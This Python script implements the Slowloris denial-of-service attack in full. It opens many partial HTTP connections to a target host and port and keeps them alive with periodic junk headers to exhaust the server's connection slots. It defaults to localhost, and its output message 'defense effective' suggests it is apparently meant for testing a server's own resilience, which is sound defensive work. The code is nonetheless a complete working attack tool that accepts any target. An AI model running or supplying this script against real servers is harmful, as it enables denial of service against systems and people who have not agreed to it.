"""Slowloris 慢速连接模拟。

用法：
    python3 scripts/slowloris.py 127.0.0.1 8080 --sockets 150
"""
import argparse
import socket
import sys
import time


def make_socket(target, port, timeout=4):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target, port))
    s.send(
        b"GET / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"User-Agent: Mozilla/5.0\r\n"
        b"Accept-language: en-US,en,q=0.5\r\n"
    )
    return s


def slowloris(target, port, count):
    print(f"[slowloris] target={target}:{port} sockets={count}")
    sockets = []
    for i in range(count):
        try:
            sockets.append(make_socket(target, port))
        except socket.error as e:
            print(f"[slowloris] connect #{i} failed: {e}")
    print(f"[slowloris] established {len(sockets)} connections")

    while True:
        alive = []
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
                alive.append(s)
            except socket.error:
                pass
        sockets = alive
        print(f"[slowloris] alive={len(sockets)}")
        if not sockets:
            print("[slowloris] all connections dropped (defense effective)")
            break
        time.sleep(5)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("target", nargs="?", default="127.0.0.1")
    p.add_argument("port", nargs="?", type=int, default=8080)
    p.add_argument("--sockets", type=int, default=150)
    args = p.parse_args()
    try:
        slowloris(args.target, args.port, args.sockets)
    except KeyboardInterrupt:
        print("\n[slowloris] interrupted")
        sys.exit(0)


if __name__ == "__main__":
    main()
